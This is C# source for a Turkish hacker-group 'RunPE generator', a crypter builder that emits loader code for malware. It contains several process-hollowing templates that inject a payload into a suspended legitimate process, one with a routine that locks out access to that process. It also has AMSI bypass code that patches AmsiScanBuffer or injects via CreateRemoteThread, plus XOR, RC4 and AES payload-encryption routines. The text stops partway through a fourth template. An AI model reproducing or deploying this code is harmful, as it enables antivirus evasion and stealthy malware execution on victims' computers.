//------------------------------------
// Coded by Kage                     |
// TurkHackTeam - slowbaskan123      |
// Untected Master - Ankara / Turkey |
//------------------------------------



using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RunPEGenerator
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("Coded By Kage", "Telegram = KageSoftware", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        

            string generatedCode = string.Empty;


        private void GenerateButton_Click(object sender, EventArgs e)
        {
            string selectedRunPEType = GetSelectedRunPEType();
            string generatedCode = string.Empty;

            switch (selectedRunPEType)
            {
                case "Type 1":
                    generatedCode = GenerateRunPEType1();
                    break;
                case "Type 2":
                    generatedCode = GenerateRunPEType2();
                    break;
                case "Type 3":
                    generatedCode = GenerateRunPEType3();
                    break;
                case "Type 4":
                    generatedCode = GenerateRunPEType4();
                    break;
                case "x0r Şifreleme":
                    generatedCode = Xor_sifreleme();
                    break;
                case "RC4 Şifreleme":
                    generatedCode = RC4_sifreleme();
                    break;
                case "AES Şifreleme":
                    generatedCode = AES_sifreleme();
                    break;
                case "AMSI Bypass 2":
                    generatedCode = AMSI_bypas2();
                    break;
                case "AMSI Bypass 3":
                    generatedCode = AMSI_bypass3();
                    break;
                default:
                    MessageBox.Show("Geçersiz Kod Yapısı !");
                    return;
            }


            string obfuscatedCode = ObfuscateCode(generatedCode, selectedRunPEType);


            OutputTextBox.Text = obfuscatedCode;
        }

        private string GetSelectedRunPEType()
        {
            if (Type1RadioButton.Checked)
                return "Type 1";
            if (Type2RadioButton.Checked)
                return "Type 2";
            if (Type3RadioButton.Checked)
                return "Type 3";
            if (Type4RadioButton.Checked)
                return "Type 4";
            if (Type5RadioButton.Checked)
                return "x0r Şifreleme";
            if (Type6RadioButton.Checked)
                return "RC4 Şifreleme";
            if (Type41RadioButton.Checked)
                return "AMSI Bypass 2";
            if (Type42RadioButton.Checked)
                return "AMSI Bypass 3";
            if (Type7RadioButton.Checked)
                return "AES Şifreleme";

            return string.Empty; 
        }




        private string GenerateRunPEType1()
        {
            return @"
using System;
using System.Runtime.InteropServices;

// ReSharper disable InconsistentNaming
public static unsafe class CMemoryExecute
{
    /// <summary>
    /// Runs an EXE (which is loaded in a byte array) in memory.
    /// </summary>
    /// <param name=""exeBuffer"">The EXE buffer.</param>
    /// <param name=""hostProcess"">Full path of the host process to run the buffer in.</param>
    /// <param name=""optionalArguments"">Optional command line arguments.</param>
    /// <returns></returns>
    public static bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments = """")
    {
  var IMAGE_SECTION_HEADER = new byte[0x28]; // pish
  var IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
  var IMAGE_DOS_HEADER = new byte[0x40]; // pidh
  var PROCESS_INFO = new int[0x4]; // pi
  var CONTEXT = new byte[0x2cc]; // ctx

  byte* pish;
  fixed (byte* p = &IMAGE_SECTION_HEADER[0])
    pish = p;

  byte* pinh;
  fixed (byte* p = &IMAGE_NT_HEADERS[0])
    pinh = p;

  byte* pidh;
  fixed (byte* p = &IMAGE_DOS_HEADER[0])
    pidh = p;

  byte* ctx;
  fixed (byte* p = &CONTEXT[0])
    ctx = p;

  // Set the flag.
  *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;

  // Get the DOS header of the EXE.
  Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

  /* Sanity check:  See if we have MZ header. */
  if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
    return false;

  var e_lfanew = *(int*)(pidh + 0x3c);

  // Get the NT header of the EXE.
  Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

  /* Sanity check: See if we have PE00 header. */
  if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
    return false;

  // Run with parameters if necessary.
  if (!string.IsNullOrEmpty(optionalArguments))
    hostProcess += "" "" + optionalArguments;

  if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x44], PROCESS_INFO))
    return false;

  var ImageBase = new IntPtr(*(int*) (pinh + 0x34));
  NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase);
  if (VirtualAllocEx((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
    Run(exeBuffer, hostProcess, optionalArguments); // Memory allocation failed; try again (this can happen in low memory situations)

  fixed (byte* p = &exeBuffer[0])
    NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);

  for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
  {
    Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
    fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
    NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
  }

  NtGetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);  
  NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)( *(uint*)(ctx + 0xAC /* ecx */)), ImageBase, 0x4, IntPtr.Zero);
  *(uint*) (ctx + 0xB0 /* eax */) = (uint)ImageBase + *(uint*) (pinh + 0x28 /* AddressOfEntryPoint */);
  NtSetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);
  NtResumeThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, IntPtr.Zero);

  return true;
    }

    #region WinNT Definitions

    private const uint CONTEXT_FULL = 0x10007;
    private const int CREATE_SUSPENDED = 0x4;
    private const int MEM_COMMIT = 0x1000;
    private const int MEM_RESERVE = 0x2000;
    private const int PAGE_EXECUTE_READWRITE = 0x40;
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
    private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

    #region WinAPI
    [DllImport(""kernel32.dll"", SetLastError = true)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

    [DllImport(""ntdll.dll"", SetLastError = true)]
    private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
    #endregion

    #endregion
}
";
        }

        private string GenerateRunPEType2()
        {
            return @"
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Security;
public static class RunPE
{
    [DllImport(""kernel32.dll"", EntryPoint = ""CreateProcess"", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
    private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);


    [DllImport(""kernel32.dll"", EntryPoint = ""GetThreadContext""), SuppressUnmanagedCodeSecurity]
    private static extern bool GetThreadContext(IntPtr thread, int[] context);


    [DllImport(""kernel32.dll"", EntryPoint = ""Wow64GetThreadContext""), SuppressUnmanagedCodeSecurity]
    private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);


    [DllImport(""kernel32.dll"", EntryPoint = ""SetThreadContext""), SuppressUnmanagedCodeSecurity]
    private static extern bool SetThreadContext(IntPtr thread, int[] context);


    [DllImport(""kernel32.dll"", EntryPoint = ""Wow64SetThreadContext""), SuppressUnmanagedCodeSecurity]
    private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);


    [DllImport(""kernel32.dll"", EntryPoint = ""ReadProcessMemory""), SuppressUnmanagedCodeSecurity]
    private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);


    [DllImport(""kernel32.dll"", EntryPoint = ""WriteProcessMemory""), SuppressUnmanagedCodeSecurity]
    private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);


    [DllImport(""ntdll.dll"", EntryPoint = ""NtUnmapViewOfSection""), SuppressUnmanagedCodeSecurity]
    private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);


    [DllImport(""kernel32.dll"", EntryPoint = ""VirtualAllocEx""), SuppressUnmanagedCodeSecurity]
    private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);


    [DllImport(""kernel32.dll"", EntryPoint = ""ResumeThread""), SuppressUnmanagedCodeSecurity]
    private static extern int ResumeThread(IntPtr handle);


    [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
    private struct ProcessInformation
    {
        public readonly IntPtr ProcessHandle;
        public readonly IntPtr ThreadHandle;
        public readonly uint ProcessId;
        private readonly uint ThreadId;
    }
    [StructLayout(LayoutKind.Sequential, Pack = 3 - 2)]
    private struct StartupInformation
    {
        public uint Size;
        private readonly string Reserved1;
        private readonly string Desktop;
        private readonly string Title;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 18 + 18)] private readonly byte[] Misc;
        private readonly IntPtr Reserved2;
        private readonly IntPtr StdInput;
        private readonly IntPtr StdOutput;
        private readonly IntPtr StdError;
    }

    public static bool Run(string path, byte[] data, bool protect)
    {
        for (int I = 1; I <= 5; I++)
            if (HandleRun(path, data, protect)) return true;
        return false;
    }
    private static bool HandleRun(string path, byte[] data, bool protect)
    {
        int readWrite = 0;
        string quotedPath = ""#by-unknown"";
        StartupInformation si = new StartupInformation();
        ProcessInformation pi = new ProcessInformation();
        si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
        try
        {
            if (!CreateProcess(path, quotedPath, IntPtr.Zero, IntPtr.Zero, false, 2 + 2, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
            int fileAddress = BitConverter.ToInt32(data, 120 / 2);
            int imageBase = BitConverter.ToInt32(data, fileAddress + 26 + 26);
            int[] context = new int[179];
            context[0] = 32769 + 32769;
            if (IntPtr.Size == 8 / 2)
            { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
            else
            { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
            int ebx = context[41];
            int baseAddress = 1 - 1;
            if (!ReadProcessMemory(pi.ProcessHandle, ebx + 4 + 4, ref baseAddress, 2 + 2, ref readWrite)) throw new Exception();
            if (imageBase == baseAddress)
                if (NtUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 1 - 1) throw new Exception();
            int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 160 / 2);
            int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 42 + 42);
            bool allowOverride = false;
            int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 6144 + 6144, 32 + 32);

            if (newImageBase == 0) throw new Exception();
            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, data, sizeOfHeaders, ref readWrite)) throw new Exception();
            int sectionOffset = fileAddress + 124 * 2;
            short numberOfSections = BitConverter.ToInt16(data, fileAddress + 3 + 3);
            for (int I = 1 - 1; I < numberOfSections; I++)
            {
                int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 6 + 6);
                int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 8 + 8);
                int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 40 / 2);
                if (sizeOfRawData != 1 - 1)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 2 - 2, sectionData.Length);
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                }
                sectionOffset += 120 / 3;
            }
            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, ebx + 16 / 2, pointerData, 2 * 2, ref readWrite)) throw new Exception();
            int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 80 / 2);
            if (allowOverride) newImageBase = imageBase;
            context[22 + 22] = newImageBase + addressOfEntryPoint;

            if (IntPtr.Size == 2 + 2)
            {
                if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
            }
            else
            {
                if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
            }
            if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
            if (protect) Protect(pi.ProcessHandle);
        }
        catch
        {
            Process p = Process.GetProcessById(Convert.ToInt32(pi.ProcessId));
            p.Kill();
            return false;
        }
        return true;
    }

    [DllImport(""advapi32.dll"", SetLastError = true)]
    private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

    private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor rawSecurityDescriptor)
    {
        byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1 + 1)];
        rawSecurityDescriptor.GetBinaryForm(array, 0);
        bool flag = !SetKernelObjectSecurity(processHandle, 4, array);
        if (flag)
        {
            throw new Win32Exception();
        }
    }

    private static T InlineAssignHelper<T>(ref T target, T value)
    {
        target = value;
        return value;
    }

    private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
    {
        byte[] array = new byte[0];
        uint bufferSize = new uint();
        GetKernelObjectSecurity(processHandle, 4, array, 0u, ref bufferSize);
        if (bufferSize < 0 || bufferSize > short.MaxValue)
        {
            throw new Win32Exception();
        }

        bool cdt = !GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)bufferSize) - 1UL) + 1 - 1 + 1)]), bufferSize, ref bufferSize);
        if (cdt)
        {
            throw new Win32Exception();
        }
        return new RawSecurityDescriptor(array, 0);
    }

    private static void Protect(IntPtr processHandle)
    {
        RawSecurityDescriptor rawSecurityDescriptor = GetProcessSecurityDescriptor(processHandle);
        rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
        SetProcessSecurityDescriptor(processHandle, rawSecurityDescriptor);
    }
}
";

        }

        private string GenerateRunPEType3()
        {
            return @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RunPE
{

    public static class RunPE
    {

        #region API delegate
        private delegate int DelegateResumeThread(IntPtr handle);
        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion


        #region API
        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>(""kernel32"", ""ResumeThread"");
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>(""kernel32"", ""Wow64SetThreadContext"");
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>(""kernel32"", ""SetThreadContext"");
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>(""kernel32"", ""Wow64GetThreadContext"");
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>(""kernel32"", ""GetThreadContext"");
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>(""kernel32"", ""VirtualAllocEx"");
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>(""kernel32"", ""WriteProcessMemory"");
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>(""kernel32"", ""ReadProcessMemory"");
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>(""ntdll"", ""ZwUnmapViewOfSection"");
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>(""kernel32"", ""CreateProcessA"");
        #endregion


        #region CreateAPI
        [DllImport(""kernel32"", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport(""kernel32"", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion


        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion


        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0) throw new Exception();
                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0x0) throw new Exception();
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 0x28;
                    }
                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 0x4)
                    {
                        if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    else
                    {
                        if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }
                break;
            }
        }
    }

}
";
        }
        private string AMSI_bypas2()
        {
            return @"
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport(""amsi.dll"", SetLastError = true)]
    public static extern int AmsiScanBuffer(IntPtr buffer, uint size, string appName, IntPtr session, out int result);

    [DllImport(""kernel32.dll"")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(""kernel32.dll"", CharSet = CharSet.Auto)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    static void Main()
    {
        IntPtr amsiHandle = GetModuleHandle(""amsi.dll"");

        if (amsiHandle == IntPtr.Zero)
        {
            Console.WriteLine(""AMSİ DLL bulunamadı."");
            return;
        }

        // Get the address of the AmsiScanBuffer function
        IntPtr amsiScanBufferAddr = GetProcAddress(amsiHandle, ""AmsiScanBuffer"");

        if (amsiScanBufferAddr == IntPtr.Zero)
        {
            Console.WriteLine(""AmsiScanBuffer fonksiyonu bulunamadı."");
            return;
        }

        // Overwrite the AmsiScanBuffer function with NOP (No Operation)
        Marshal.WriteByte(amsiScanBufferAddr, 0x90); // NOP (No Operation)

        Console.WriteLine(""AMSİ bypass işlemi tamamlandı. AmsiScanBuffer fonksiyonu geçici olarak devre dışı bırakıldı."");
    }
}

";
        }
        private string AMSI_bypass3()
        {
            return @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class AMSIBypass
{
    // AMSI.dll'yi enjekte etmek için gerekli Windows API fonksiyonları
    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    public static extern bool CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;

    static void Main()
    {
        // Hedef işlem ID'si (örneğin, PowerShell veya başka bir uygulama)
        int targetProcessId = 1234; // Hedef sürecin ID'sini buraya yazın

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);

        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine(""Hedef işlem açılamadı."");
            return;
        }

        // AMSI DLL'sinin yolu
        string amsiDllPath = ""amsi.dll""; // Ya da başka bir yol

        // AMSI DLL'sini hedef işlem bellek alanına yaz
        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(amsiDllPath.Length + 1), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (allocatedMemory == IntPtr.Zero)
        {
            Console.WriteLine(""Bellek ayırma başarısız."");
            return;
        }

        // AMSI DLL yolunu hedef belleğe yaz
        byte[] dllPathBytes = System.Text.Encoding.ASCII.GetBytes(amsiDllPath);
        uint bytesWritten;
        if (!WriteProcessMemory(hProcess, allocatedMemory, dllPathBytes, (uint)dllPathBytes.Length, out bytesWritten))
        {
            Console.WriteLine(""Yazma işlemi başarısız."");
            return;
        }

        // LoadLibraryA fonksiyonunun adresini al
        IntPtr loadLibraryAddr = GetProcAddress(LoadLibrary(""kernel32.dll""), ""LoadLibraryA"");

        // Hedef işleme AMSI DLL'sini yüklemek için yeni bir thread başlat
        IntPtr remoteThread = IntPtr.Zero;
        if (!CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocatedMemory, 0, out remoteThread))
        {
            Console.WriteLine(""Thread başlatma başarısız."");
            return;
        }

        Console.WriteLine(""AMSİ bypass işlemi başarılı! AMSI DLL'si hedef işleme enjekte edildi."");
    }
}

";
        }

        private string RC4_sifreleme()
        {
            return @"
		public byte[] RC4(byte[] Input, string Keys)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(Keys);
			int num = 0;
			int[] array = new int[256];
			byte[] array2 = new byte[Input.Length - 1 + 1];
			int i;
			for (i = 0; i <= 255; i++)
			{
				array[i] = i;
			}
			for (i = 0; i <= 255; i++)
			{
				num = (num + (int)bytes[i % bytes.Length] + array[i] & 255);
				int num2 = array[i];
				array[i] = array[num];
				array[num] = num2;
			}
			i = 0;
			num = 0;
			for (int j = 0; j <= array2.Length - 1; j++)
			{
				i = (i + 1 & 255);
				num = (num + array[i] & 255);
				int num2 = array[i];
				array[i] = array[num];
				array[num] = num2;
				array2[j] = Convert.ToByte((int)Input[j] ^ array[array[i] + array[num] & 255]);
			}
			return array2;
		}
";
        }

        private string Xor_sifreleme()
        {
            return @"
    static byte[] Xor_sifreleme(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }
        ";
        }

        private string AES_sifreleme()
        {
            return @"
        static byte[] AESEncrypt(string plainText, string key, string iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key);
                aesAlg.IV = Encoding.UTF8.GetBytes(iv);

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }
                    }
                    return ms.ToArray();
                }
            }
        }
";
        }


        private string GenerateRunPEType4()
        {
            return @"
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Offline.Special
{
    internal static class AmsiResolver
    {
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpFileName);

